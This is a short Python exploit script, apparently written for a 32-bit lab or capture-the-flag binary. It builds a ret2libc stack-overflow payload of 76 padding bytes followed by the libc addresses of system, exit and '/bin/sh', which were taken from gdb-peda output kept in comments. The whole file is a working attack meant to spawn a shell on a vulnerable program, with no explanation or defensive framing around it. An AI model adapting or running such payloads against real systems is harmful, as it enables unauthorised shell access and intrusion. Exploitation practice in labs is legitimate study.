#!/usr/bin/pyhton

from struct import pack

#gdb-peda$ p system
#$1 = {<text variable, no debug info>} 0xb7e53310 <__libc_system>
#gdb-peda$ p exit
#$2 = {<text variable, no debug info>} 0xb7e46260 <__GI_exit>
#gdb-peda$ find "/bin/sh" all
#Searching for '/bin/sh' in: all ranges
#Found 1 results, display max 1 items:
#libc : 0xb7f75d4c ("/bin/sh")

if __name__ == '__main__':

	# EIP -> system + exit + bin_sh

	system_addr = pack("<I",0xb7e53310)
	exit_addr = pack("<I",0xb7e46260)
	bin_sh_addr = pack("<I",0xb7f75d4c)


	offset = 76
	junk = "A"*offset
	EIP = system_addr + exit_addr + bin_sh_addr

	payload = junk + EIP

	print payload
